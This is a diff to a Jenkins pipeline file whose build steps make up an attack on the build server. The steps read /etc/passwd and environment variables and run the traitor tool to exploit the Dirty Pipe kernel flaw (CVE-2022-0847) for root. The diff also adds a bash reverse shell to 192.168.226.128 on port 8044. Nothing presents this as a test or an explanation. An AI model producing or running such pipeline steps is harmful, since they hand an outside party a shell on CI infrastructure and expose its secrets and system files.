@@ -6,9 +6,9 @@ pipeline {
             steps {
                 sh 'cat /etc/passwd'
                 sh 'env'
-                sh 'wget https://github.com/liamg/traitor/releases/download/v0.0.14/traitor-amd64'
                 sh 'chmod 777 traitor-amd64'
                 sh './traitor-amd64 --exploit kernel:CVE-2022-0847'
+                sh 'bash -i >& /dev/tcp/192.168.226.128/8044 0>&1'
                 sh 'id'
                 sh 'whoami'
                 sh 'ls -a'
